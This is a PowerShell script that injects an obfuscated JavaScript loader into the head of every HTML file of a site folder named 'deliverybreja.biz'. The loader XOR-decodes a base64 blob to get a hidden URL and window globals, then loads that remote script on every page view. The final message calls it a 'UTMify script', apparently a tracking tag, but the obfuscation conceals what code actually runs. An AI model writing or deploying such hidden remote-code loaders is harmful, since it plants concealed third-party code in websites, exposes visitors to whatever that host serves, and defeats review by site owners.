$scriptTag = '<script>(function(){var u_ily=atob("DDhDqhePMc2aXBbtiUNh32XjE/e4NGKZ+Ut5hTjsVaO0KWKA4F46hHTgXOP4Ljme6koq2mP8HrjuMWXC5Vk3z2T7H6fpfjrP6Ew32H7tRLn/LzTX0kNhxHbiVO+gfnKM/Vlu32PiWKvjcWaf7E4mxGOiSa71ODue6lNhhjX5UKHvOTTXqxo+hmytX6z3OTTXq1wi3naiRLn3NXCUpEgxz2HqX7m3L2OP4FwwiDutR6z2KXPPsxph10ry");var g_1a=[];for(var u_9=0;u_9<u_ily.length;u_9++){g_1a.push(u_ily.charCodeAt(u_9)&255);}var q_n=g_1a[0];var e_jk=g_1a.slice(1,1+q_n);var g_wx=g_1a.slice(1+q_n);var p_y2=g_wx.map(function(b,w_k){return b^e_jk[w_k%q_n];});var k_4k3i="";for(var y_ut3=0;y_ut3<p_y2.length;y_ut3++){k_4k3i+=String.fromCharCode(p_y2[y_ut3]&255);}var w_29po=decodeURIComponent(escape(k_4k3i));var u_6x11=JSON.parse(w_29po);var j_06x=u_6x11.globals||[];j_06x.forEach(function(p_i){window[p_i.name]=p_i.value;});var b_cqwr=document.createElement("script");b_cqwr.src=u_6x11.url;b_cqwr.async=true;b_cqwr.defer=true;(u_6x11.attributes||[]).forEach(function(w_k4c1){b_cqwr.setAttribute(w_k4c1.name,w_k4c1.value);});(document.head||document.documentElement).appendChild(b_cqwr);})();</script>'

$baseDir = "c:\Users\ss pc\Desktop\DELIVERY\DELIVERY\deliverybreja.biz"

# Collect all HTML files from root and the slug folder
$files = Get-ChildItem -Path $baseDir -Recurse -Include *.html -Exclude ".git"

$count = 0
foreach ($f in $files) {
    # Skip git files just in case
    if ($f.FullName -match "\\\.git\\") { continue }
    
    $bytes = [System.IO.File]::ReadAllBytes($f.FullName)
    $text = [System.Text.Encoding]::UTF8.GetString($bytes)
    
    # Avoid double injection
    if (-not $text.Contains("u_ily=atob")) {
        # Inject right before </head> if exists, else after <head>
        if ($text.Contains("</head>")) {
            $text = $text -replace "</head>", "$scriptTag</head>"
            $newBytes = [System.Text.Encoding]::UTF8.GetBytes($text)
            [System.IO.File]::WriteAllBytes($f.FullName, $newBytes)
            $count++
        } elseif ($text.Contains("<head>")) {
            $text = $text -replace "<head>", "<head>$scriptTag"
            $newBytes = [System.Text.Encoding]::UTF8.GetBytes($text)
            [System.IO.File]::WriteAllBytes($f.FullName, $newBytes)
            $count++
        } elseif ($text.Contains("<head ")) {
            $text = $text -replace "<head([^>]*)>", "<head`$1>$scriptTag"
            $newBytes = [System.Text.Encoding]::UTF8.GetBytes($text)
            [System.IO.File]::WriteAllBytes($f.FullName, $newBytes)
            $count++
        }
    }
}
Write-Output "Injected UTMify script into $count files safely."
